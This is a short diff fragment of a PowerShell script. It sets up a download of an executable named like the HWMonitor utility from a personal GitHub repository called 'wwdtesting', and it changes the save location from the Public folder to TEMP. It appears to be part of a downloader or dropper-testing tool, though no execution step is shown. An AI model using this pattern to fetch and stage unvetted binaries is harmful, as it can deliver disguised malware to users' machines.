@@ -7,7 +7,7 @@
 $BinaryUrl = "https://github.com/mibomboclaaat/wwdtesting/raw/refs/heads/main/hwmonitor_1.58.exe"
 
 # Destination path for the binary (world-writable directory)
-$DestinationPath = "$env:PUBLIC\HWMonitor_x64.exe"
+$DestinationPath = "$env:TEMP\HWMonitor_x64.exe"
 
 try {
     Write-Host "[*] Starting download from GitHub..."
